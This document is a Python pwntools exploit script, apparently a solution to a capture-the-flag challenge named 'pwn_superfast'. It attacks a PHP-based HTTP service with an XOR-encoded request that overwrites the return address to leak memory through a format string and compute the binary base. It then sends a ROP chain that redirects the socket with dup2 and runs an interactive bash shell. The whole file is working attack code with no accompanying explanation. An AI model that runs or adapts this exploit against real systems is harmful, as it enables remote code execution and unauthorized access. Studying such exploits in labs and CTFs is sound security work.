#!/usr/bin/env python3
from pwn import *
import urllib.parse

context.arch = 'amd64'
context.log_level = 'info'

def make_payload(buf, key=1):
    """
    Creates an HTTP request with XOR-encoded payload.
    The server XORs the payload again → we get our original payload back.
    """
    buf = list(buf)
    # XOR-encode (only the first 63 bytes are XORed according to decrypt())
    for i in range(min(63, len(buf))):
        buf[i] ^= key
    buf = bytes(buf)
    
    payload = "GET /?cmd="
    payload += urllib.parse.quote(buf)
    payload += " HTTP/1.1\r\n"
    payload += "User-Agent: Pwner\r\n"
    payload += "Host: localhost\r\n"
    payload += f"Cmd-Key: {key}\r\n\r\n"
    return payload.encode()

def exploit(host, port):
    # Load PHP binary for symbols
    try:
        e = ELF("/tmp/php_binary", checksec=False)
    except:
        log.error("PHP binary not found! Run: docker cp pwn_superfast_test:/usr/local/bin/php /tmp/php_binary")
        return
    
    log.info("=" * 60)
    log.info("Phase 1: Format String Leak via Partial Overwrite")
    log.info("=" * 60)
    
    # Offset to return address in decrypt(): 0x98 = 152 bytes
    OFFSET = 0x98
    
    # Payload: Format String Specifiers + Padding + Partial Overwrite
    # 0x40 overwrites last byte of RET address → jumps to call print_message (0x1440)
    leak_payload = flat({
        0: b'%p-' * 30,      # Format string for leaks
        OFFSET: p8(0x40)     # Partial overwrite → print_message
    })
    
    payload = make_payload(leak_payload)
    
    log.info(f"Sending leak payload ({len(leak_payload)} bytes)...")
    r = remote(host, port)
    r.send(payload)
    
    # Parse HTTP Response
    r.recvuntil(b'\r\n\r\n')
    resp = r.recvall(timeout=2)
    r.close()
    
    if not resp or b'%p' in resp:
        log.error("Format string not executed - Partial overwrite failed")
        return
    
    log.success(f"Leaked data: {resp[:200]}...")
    
    # Parse leaks (separated by '-')
    leaks = resp.split(b'-')
    log.info(f"Found leaks: {len(leaks)}")
    
    for i, leak in enumerate(leaks[:15]):
        log.info(f"  Leak[{i}]: {leak}")
    
    # Find the executor_globals leak - it's a PHP binary pointer (0x55... or 0x56...)
    php_base = None
    for i, leak in enumerate(leaks):
        try:
            addr = int(leak, 16)
            # Look for addresses in PHP binary range (0x55... or 0x56...)
            if 0x550000000000 <= addr <= 0x5700000000000:
                # Check if it could be executor_globals
                offset_to_eg = addr - e.sym['executor_globals']
                # Base should be 0x1000 aligned
                if offset_to_eg > 0 and (offset_to_eg & 0xfff) == 0:
                    log.success(f"Found! Leak[{i}] = {hex(addr)} is executor_globals")
                    php_base = offset_to_eg
                    break
        except (ValueError, IndexError):
            continue
    
    if php_base is None:
        # Fallback: Use index 5
        log.warning("Could not automatically find executor_globals, trying index 5 and 11...")
        for idx in [5, 11]:
            try:
                addr = int(leaks[idx], 16)
                if addr > 0x10000:
                    php_base = addr - e.sym['executor_globals']
                    if php_base > 0:
                        log.info(f"Trying Leak[{idx}] = {hex(addr)}")
                        break
            except:
                continue
    
    if php_base is None:
        log.error("Could not calculate PHP base")
        return
        
    e.address = php_base
    log.success(f"PHP Base: {hex(e.address)}")
    
    log.info("=" * 60)
    log.info("Phase 2: ROP Chain for Shell")
    log.info("=" * 60)
    
    # Build ROP Chain
    rop = ROP(e)
    
    # dup2(4, 0/1/2) - Redirect socket to stdin/stdout/stderr
    # Socket FD is usually 4 on PHP Dev Server
    rop.call('dup2', [4, 0])
    rop.call('dup2', [4, 1])
    rop.call('dup2', [4, 2])
    
    # Find /bin/bash and -i strings in PHP binary
    try:
        binsh = next(e.search(b"/bin/bash\x00"))
        dashi = next(e.search(b"-i\x00"))
    except StopIteration:
        # Fallback: /bin/sh
        binsh = next(e.search(b"/bin/sh\x00"))
        dashi = 0
    
    log.info(f"/bin/bash at: {hex(binsh)}")
    log.info(f"-i at: {hex(dashi)}")
    
    # execl("/bin/bash", "/bin/bash", "-i", 0)
    rop.call('execl', [binsh, binsh, dashi, 0])
    
    log.info(rop.dump())
    
    # Final payload
    shell_payload = b"A" * OFFSET + rop.chain()
    payload = make_payload(shell_payload)
    
    log.info("Sending shell payload...")
    r = remote(host, port)
    r.send(payload)
    
    log.success("Shell should now be available!")
    r.interactive(prompt='')

def main():
    import argparse
    parser = argparse.ArgumentParser(description="pwn_superfast Exploit")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=1337, help="Target port")
    args = parser.parse_args()
    
    exploit(args.host, args.port)

if __name__ == "__main__":
    main()
